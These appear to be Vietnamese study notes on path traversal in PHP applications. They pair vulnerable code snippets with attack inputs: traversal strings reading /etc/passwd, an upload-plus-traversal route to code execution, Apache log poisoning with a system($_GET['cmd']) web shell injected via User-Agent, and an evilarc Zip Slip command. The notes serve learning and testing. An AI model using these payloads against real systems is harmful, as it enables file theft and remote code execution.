### Example 1

```
$file_path = '/var/www/html/images/' . $file_name;
```

Thư mục hiện tại `/var/www/html/images/` như vậy để quay về được thư mục gốc cần `../../../../`. -> $file_name=../../../../etc/passwd

### Example 2

```
if (strpos($file, "..") !== false)
    die("detected");
if (file_exists($file)) {
    header('Content-Type: image/png');
    readfile($file);
```

Filter `..`, nhưng không có đường dẫn thư mục hiện tại như ex trước. --> $file_name=/etc/passwd

### Example 3

```
$_SESSION['dir'] = '/var/www/html/upload/' . bin2hex(random_bytes(16));

$album = $dir . "/" . strtolower($_POST['album']);
...
$newFile = $album . "/" . $files["name"][$i];
move_uploaded_file($files["tmp_name"][$i], $newFile);
```

Ex này có chức năng upload file --> Khai thác kết hợp lỗ hỏng File Up Load với Path_traversal --> RCE. 

### Example 4

### Example 5

```
<?php include './views/' . $game; ?>
```

PHP include là một hàm cho phép copy hết tất cả nội dung của file khác vào file hiện tại, rồi thực thi.

Đối với httpd Apache, mặc định các request sẽ được ghi log lại ở đường dẫn /var/log/apache2/access.log.

Một số trường ta có thể thay đổi trong gói tin HTTP gửi lên server là: Request String, Referer, và User-Agent

`system($_GET['cmd'])`

### Example 6

Lỗi Zip Slip, sử dụng công cụ cho phép thay đổi tên file sao cho có chứa ../. Một trong các công cụ nổi tiếng là evilarc:

python3 evilarc.py -d 2 -o unix info.php











